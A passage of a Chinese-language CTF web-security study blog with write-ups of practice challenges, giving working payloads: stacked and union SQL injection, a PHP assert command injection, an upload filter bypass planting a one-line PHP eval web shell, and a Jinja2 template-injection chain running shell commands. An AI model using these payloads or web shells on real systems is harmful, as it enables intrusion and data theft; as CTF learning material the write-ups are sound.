src="/assets/img/20200315学习总结/20200315学习总结5.jpg"><br>发现在19198109931114514表中存在我们想要的flag，且查询的时候是查询words表里的id，故我们尝试更改表名并把flag列名修改成id列名，19198109931114514表名修改成words表名。<br>最终payload：<code>1&#39;;rename tables `words` to `words1`;rename tables `1919810931114514` to `words`; alter table `words` change `flag` `id` varchar(100)</code><br><img src="/assets/img/20200315学习总结/20200315学习总结6.jpg"><br>最后通过<code>1&#39;or &#39;1&#39;=&#39;1 #</code>得到flag。<br><img src="/assets/img/20200315学习总结/20200315学习总结7.jpg">  </p>
<h3 id="php-弱类型比较"><a href="#php-弱类型比较" class="headerlink" title="php == 弱类型比较"></a>php == 弱类型比较</h3><p>php中有两种比较方式，<code>==</code>和<code>===</code>，其中==在进行比较的时候，会先将字符串类型转化成相同，再比较，而===在进行比较的时候，会先判断两种字符串的类型是否相等，再比较。举几个例子：<br><img src="/assets/img/20200315学习总结/20200315学习总结8.jpg"><br>当php比较字符串和数字时，会将字符串向数字尝试转换，字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则值为0。但当字符串中出现.,e,E等字符时，如果字符前后都可转化为合法数字，则.会使字符串转化为小数，e,E会将字符串转换为科学计数法表示的数字。布尔值和数字比较时，true和大于等于1的数弱类型相等，false和0相等。  </p>
<h3 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title="git源码泄露"></a>git源码泄露</h3><p>git是一个是一个开源的分布式版本控制系统，可以有效、高速地处理从很小到非常大的项目版本管理。而初始化一个git目录时，会产生一个.git的文件夹，如果没有处理好则会造成git源码泄露。git源码可以通过GitHack来获取文件。以一个题目来举例子。<br>题目链接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5002&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5002&amp;page=1</a><br>拿到题目收集一下信息，F12发现element的注释里有个flag，访问发现为空。发现about页面提示使用了git，判断存在git源码泄露。<br><img src="/assets/img/20200315学习总结/20200315学习总结9.jpg"><br>访问/.git/目录，发现果然存在git源码泄露。<br><img src="/assets/img/20200315学习总结/20200315学习总结10.jpg"><br>随后使用<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">GitHack</a>将源码还原。<br><img src="/assets/img/20200315学习总结/20200315学习总结11.jpg"><br>打开flag.php，发现内容是空的。<br><img src="/assets/img/20200315学习总结/20200315学习总结12.jpg"><br>打开index.php看看，发现了关键代码：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<img src="/assets/img/20200315学习总结/20200315学习总结13.jpg">  
发现对page的内容只过滤了```..```，故尝试通过闭合连接字符串和执行系统命令来获取flag。故构造如下payload：```'.system("cat ./templates/flag.php").'```最后在注释里面获得flag。  
<img src="/assets/img/20200315学习总结/20200315学习总结14.jpg">  

<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload">https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload</a></p>
<p>打开题目发现有一个文件上传的接口，随便上传一个1.jpg看看，发现提示Not Image。<br><img src="/assets/img/20200315学习总结/20200315学习总结15.jpg"><br>修改请求，写入一句话木马，并修改文件名为1.php，再次上传，发现提示错误。<br><img src="/assets/img/20200315学习总结/20200315学习总结16.jpg"><br>使用phtml后缀绕过，再次提交，依然发现错误。<br><img src="/assets/img/20200315学习总结/20200315学习总结17.jpg"><br>说明后台对文件内容也进行了分析，提示发现<code>&lt;?</code>故尝试通过<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code>绕过，发现成功上传木马。<br><img src="/assets/img/20200315学习总结/20200315学习总结18.jpg"><br>下面就简单了，使用蚁剑连接。然而发现直接连接/1.phtml会报错，故猜测/upload/1.phtml路径，发现成功连接。<br><img src="/assets/img/20200315学习总结/20200315学习总结19.jpg"><br>(发现了好多不同的文件后缀，应该除了.phtml其他格式应该也能绕过吧，回头都试试嗯)<br>后面搜一搜服务器，flag就到手了。<br><img src="/assets/img/20200315学习总结/20200315学习总结20.jpg">  </p>
<h3 id="python-flask-模板注入"><a href="#python-flask-模板注入" class="headerlink" title="python flask 模板注入"></a>python flask 模板注入</h3><p>python的flask框架使用Jinja2作为模板渲染引擎，如果render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，这里将造成ssti漏洞。Jinja2中<code>&#123;&#123;&#125;&#125;```是变量包裹标识符，它会将```&#123;&#123;&#125;&#125;</code>中的内容当作变量解析替换，如果我们的url中也含有<code>&#123;&#123;&#125;&#125;```的话，就会造成ssti。
> 吐槽一句，hexo的模板渲染引擎将我文章里的```&#123;&#123;&#125;&#125;</code>给编译掉了，然而我本意就是这个符号，感觉这里有bug…<br>以一个题目举例子：<br>题目链接：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408&amp;page=1</a><br>打开题目提示python template injection，尝试发现表达式被执行，故存在ssti。<br><img src="/assets/img/20200315学习总结/20200315学习总结21.jpg"><br>我们现在需要考虑借助这个ssti获得服务器的控制台权限。因为是python的框架，所以我们需要使用python来获取控制台权限，我们想到了<code>os.system</code>和<code>os.popen</code>两个方法，前者返回<strong>退出状态码</strong>，后者以<strong>file形式</strong>返回<strong>输出内容</strong>。这里我们要看到内容，故选择<code>os.popen</code>。    </p>
<p>那么怎么找到这个方法呢，python为我们提供了完整的查找链：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__class__:返回对象所属类；</span><br><span class="line">__mro__:返回一个类所继承的基类元组，方法在解析按照元组的顺序解析；</span><br><span class="line">__base__:返回该类所继承的基类；</span><br><span class="line">__subclasses__:每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的引用的列表；</span><br><span class="line">__init__:类的初始化方法；</span><br><span class="line">__globals__:对包含函数全局变量的字典的引用。</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br><span class="line">ok，我们可以开始操作了。  </span><br><span class="line">首先找到当前变量所在的类。</span><br></pre></td></tr></table></figure>
<p>‘’.<strong>class</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器返回：  </span><br></pre></td></tr></table></figure>
<p>URL <a target="_blank" rel="noopener" href="http://111.198.29.45:59359/">http://111.198.29.45:59359/</a>&lt;type ‘str’&gt; not found</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个回复告诉我们，当前变量所在的类是str。   </span><br><span class="line">随后我们找到它的基类。   </span><br></pre></td></tr></table></figure>
<p>‘’.<strong>class</strong>.<strong>mro</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器返回：  </span><br></pre></td></tr></table></figure>
<p>URL <a target="_blank" rel="noopener" href="http://111.198.29.45:59359/">http://111.198.29.45:59359/</a>(&lt;type ‘str’&gt;, &lt;type ‘basestring’&gt;, &lt;type ‘object’&gt;) not found</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基类也有了。   </span><br><span class="line">下一步找到任意一个基类的引用列表。</span><br></pre></td></tr></table></figure>
<p>‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器返回了一大串，我们找到os所在的&#96;&#96;&#96;site._Printer&#96;&#96;&#96;类，它在第72位，即&#96;&#96;&#96;__subclasses__()[71]&#96;&#96;&#96;。   </span><br><span class="line">于是我们可以开始读取命令行输出了。   </span><br></pre></td></tr></table></figure>
<p>‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[71].<strong>init</strong>.<strong>globals</strong>[‘os’].popen(‘ls’).read()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器返回：  </span><br></pre></td></tr></table></figure>
<p>URL <a target="_blank" rel="noopener" href="http://111.198.29.45:59359/fl4g">http://111.198.29.45:59359/fl4g</a> index.py not found</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">最后一步，读取fl4g。  </span><br></pre></td></tr></table></figure>
<p>‘’.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[71].<strong>init</strong>.<strong>globals</strong>[‘os’].popen(‘cat fl4g’).read()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">服务器返回：  </span><br></pre></td></tr></table></figure>
<p>URL <a target="_blank" rel="noopener" href="http://111.198.29.45:59359/ctf%7Bf22b6844-5169-4054-b2a0-d95b9361cb57%7D">http://111.198.29.45:59359/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}</a> not found</p>
<pre><code>flag到手。  </code></pre>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/20200315%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" data-id="ckedn8mt7000cfcty2mlmdm95" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-20200313学习总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/20200313%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-date">
  <time datetime="2020-08-28T02:33:12.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/20200313%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">20200313学习总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="0x01复习一些学过的内容"><a href="#0x01复习一些学过的内容" class="headerlink" title="0x01复习一些学过的内容"></a>0x01复习一些学过的内容</h3><h4 id="http请求头"><a href="#http请求头" class="headerlink" title="http请求头"></a>http请求头</h4><p><strong>http请求头基本格式</strong><br>一个真实的http请求报文结构如下所示：  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;check.php HTTP&#x2F;1.1</span><br><span class="line">Host: 111.198.29.45:50839</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Referer:111.198.29.45:50839</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">a&#x3D;123&amp;b&#x3D;456</span><br></pre></td></tr></table></figure>
<p>解析：<br>http请求可分为三部分：请求行、请求头、请求体<br>第一行即为请求行，组成为<code>请求方法 空格 请求地址 空格 协议版本</code>，请求方法即GET POST PUT DELETE OPTION等，请求地址为请求资源路径，’/index.php’意为<code>http://111.198.29.45:50839/index.php</code>，协议版本即使用的http协议版本，1.0或1.1<br>第2-10行为请求头，即header，请求头指定了该http请求的一些基本信息，常用的请求头类型有：  </p>
<table>
<thead>
<tr>
<th>Header</th>
<th>解释</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>Accept</td>
<td>指定客户端能够接收的内容类型</td>
<td><code>Accept: text/plain,text/html,application/json</code></td>
</tr>
<tr>
<td>Accept-Charset</td>
<td>浏览器可以接受的字符编码集</td>
<td><code>Accept-Charset: iso-8859-5</code></td>
</tr>
<tr>
<td>Accept-Encoding</td>
<td>指定浏览器可支持的web服务器返回内容压缩编码类型</td>
<td><code>Accept-Encoding:compress,gzip</code></td>
</tr>
<tr>
<td>Cache-Control</td>
<td>指定请求和响应遵循的缓存机制</td>
<td><code>Cache-Control: no-cache</code></td>
</tr>
<tr>
<td>Connection</td>
<td>表示是否需要持久连接</td>
<td><code>Connection: close</code></td>
</tr>
<tr>
<td>Cookie</td>
<td>http请求发送时会把保存在该请求域名下的所有cookie一起发送给web服务器</td>
<td><code>Cookie:user=123;auth=admin;</code></td>
</tr>
<tr>
<td>Content-Length</td>
<td>请求内容长度</td>
<td><code>Content-Length: 345</code></td>
</tr>
<tr>
<td>Content-Type</td>
<td>请求的与实体对应的MIME信息</td>
<td><code>Content-Type: application/x-www-form/urlencoded</code></td>
</tr>
<tr>
<td>Date</td>
<td>请求发送时间</td>
<td><code>Date: Tue,15 Feb 2020 10:10:45 GMT</code></td>
</tr>
<tr>
<td>User-Agent</td>
<td>包含发出请求的用户信息，例如浏览器，操作系统等</td>
<td><code>User-Agent: Mozilla/5.0 (Linux;X11)</code></td>
</tr>
<tr>
<td><strong>Host</strong></td>
<td><strong>指定请求的服务器的域名和端口号</strong></td>
<td><strong><code>Host:www.abc123.com</code></strong></td>
</tr>
<tr>
<td><strong>Referer</strong></td>
<td><strong>请求来路</strong></td>
<td><strong><code>Referer: http://abc123.com/1.php</code></strong></td>
</tr>
<tr>
<td><strong>X-Forwarded-For</strong></td>
<td><strong>用户的真实ip地址</strong></td>
<td><strong><code>X-Forwarded-For: 123.123.123.123</code></strong></td>
</tr>
</tbody></table>
<p>第11行为空行，将请求头和请求体分开<br>第12行即请求体，请求体中包含查询字符串等信息  </p>
<h4 id="shell重定向，-、-amp-、-和-amp-amp-的区别"><a href="#shell重定向，-、-amp-、-和-amp-amp-的区别" class="headerlink" title="shell重定向，| 、&amp; 、|| 和 &amp;&amp; 的区别"></a>shell重定向，| 、&amp; 、|| 和 &amp;&amp; 的区别</h4><p><strong>重定向输出 ‘&gt;’</strong><br>command &gt; file<br>将command的输出写入file中，如果file文件存在，则覆盖文件内容写入，如果不存在，则创建文件。<br>command &gt;&gt; file<br>将command的输入追加到file文件的末尾。<br><strong>重定向输入 ‘&lt;’</strong><br>command &lt; file<br>将标准输入流从键盘重定向到file文件。<br><strong>管道命令 ‘|’ **<br>command1 | command2<br>将command1的stdout作为command2的stdin。<br>**后台运行进程 ‘&amp;’</strong><br>command &amp;<br>将command置于后台运行<br>** ‘||’ 和 ‘&amp;&amp;’ **<br>command1 || command2 当command1未被正确执行时，才会执行command2，否则command2不执行。<br>command1 &amp;&amp; command2 当command1被正确执行时，才会执行command2，否则command2不执行。  </p>
<h4 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h4><p>一句话木马：一句话木马就是一段简单的代码，就这短短的一行代码，就能做到和大马相当的功能。<br>代码：<code>&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code><br>这段代码的意思很简单，执行通过POST获取到的内容。例如，我们创建一个文件，名字叫shell.php,里面写入这段代码，保存，随后通过浏览器访问/shell.php，同时通过POST传入要执行的命令，例如phpinfo，发现phpinfo被执行了。<br><img src="/assets/img/20200313学习总结/20200313学习总结1.jpg"><br>我们也可以通过蚁剑来连接，在蚁剑中新建连接，地址栏输入[ip]:[port]/shell.php,密码输入shell，点击连接，发现我们直接连接上了服务器，实现了getshell的操作。  </p>
<h4 id="sql联合查询注入-无过滤"><a href="#sql联合查询注入-无过滤" class="headerlink" title="sql联合查询注入[无过滤]"></a>sql联合查询注入[无过滤]</h4><p>sql注入的原理：通过精心构造的payload，插入到原sql语句中，改变原sql语句的逻辑，从而实现攻击者想实现的操作。<br>这里回顾一下sql联合查询注入的操作。联合查询注入的前提是，页面上有显示位。所谓显示位即在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就是显示位。<br>用一个题来举例子。<br>题目来源：<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4686&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4686&amp;page=1</a><br><img src="/assets/img/20200313学习总结/20200313学习总结2.jpg"><br>拿到题目，发现search框输入<code>&#39;</code>(单引号)会500响应，初步判断存在sql注入。<br><img src="/assets/img/20200313学习总结/20200313学习总结3.jpg"><br>判断一下sql语句拼接方式。<br><img src="/assets/img/20200313学习总结/20200313学习总结4.jpg"><br>下一步开始注入，先判断列数。<br><img src="/assets/img/20200313学习总结/20200313学习总结5.jpg"><br>发现输入order by 3#有回显，而order by 4#则500响应，判断列数为3.<br>下一步开始逐步爆库，爆表，爆列。  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3#</span><br></pre></td></tr></table></figure>
<img src="/assets/img/20200313学习总结/20200313学习总结6.jpg">  
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;news&#39;),3#</span><br></pre></td></tr></table></figure>
<img src="/assets/img/20200313学习总结/20200313学习总结7.jpg">  
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;news&#39; and table_name&#x3D;&#39;secret_table&#39;),3#</span><br></pre></td></tr></table></figure>
<img src="/assets/img/20200313学习总结/20200313学习总结8.jpg">  
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;or &#39;1&#39;&#x3D;&#39;1&#39; union select 1,(select fl4g from secret_table),3#</span><br></pre></td></tr></table></figure>
<img src="/assets/img/20200313学习总结/20200313学习总结9.jpg">  
### 0x02一些新学的
#### php文件包含
php的include命令会首先检测include的文件是否存在，如果存在则执行该文件。以一个题为例：  
题目来源：https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1  
拿到题目可以看出是代码审计，获取hello和page参数，其中如果page参数中含有```php://```字样则会过滤。本题思路就是利用php的文件包含特性来实现代码执行。  
<img src="/assets/img/20200313学习总结/20200313学习总结10.jpg">  
<img src="/assets/img/20200313学习总结/20200313学习总结11.jpg">  
<img src="/assets/img/20200313学习总结/20200313学习总结12.jpg">  
<img src="/assets/img/20200313学习总结/20200313学习总结13.jpg">  
#### php data伪协议
还是上面那个题，除了通过文件包含，还可以利用php的data伪协议来读取文件。  
<img src="/assets/img/20200313学习总结/20200313学习总结14.jpg">  
<img src="/assets/img/20200313学习总结/20200313学习总结15.jpg">  
当然这个题也可以通过大小写绕过来实现使用```php://filter```伪协议完成文件内容读取。最后base64解码即可。  
<img src="/assets/img/20200313学习总结/20200313学习总结16.jpg">  
#### .phps源代码文件
.phps为php的源代码文件，通常在题目页面无提示时，可以结合题目提示来考虑是否存在源代码泄露，然后可以尝试读取.phps。  

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/20200313%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" data-id="ckedn8mt50008fcty7afp2not" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/c%E8%AF%AD%E8%A8%80/">c语言</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/web%E5%BC%80%E5%8F%91/">web开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">网络编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows%E7%BC%96%E7%A8%8B/">windows编程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/">软件工程</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%BC%80%E5%8F%91/" rel="tag">web开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%E7%BC%96%E7%A8%8B/" rel="tag">windows编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" rel="tag">网络编程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/" rel="tag">软件工程</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 10px;">c语言</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">web安全</a> <a href="/tags/web%E5%BC%80%E5%8F%91/" style="font-size: 15px;">web开发</a> <a href="/tags/windows%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">windows编程</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 10px;">算法</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" style="font-size: 10px;">网络编程</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10px;">计算机网络</a> <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/" style="font-size: 10px;">软件工程</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/08/28/%E6%B4%9B%E8%B0%B7%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1-1-2-3%E7%BB%84/">洛谷刷题记录(1)(1,2,3组)</a>
          </li>
        
          <li>
            <a href="/2020/08/28/ctfshow%E8%90%8C%E6%96%B0%E8%AE%A1%E5%88%92%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">ctfshow萌新计划刷题记录</a>
          </li>
        
          <li>
            <a href="/2020/08/28/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/">buu刷题记录1</a>
          </li>
        
          <li>
            <a href="/2020/08/28/csrf-ssrf-session%E4%BC%AA%E9%80%A0/">csrf&amp;ssrf&amp;session伪造</a>
          </li>
        
          <li>
            <a href="/2020/08/28/xxe%E9%97%AE%E9%A2%98/">xxe问题</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>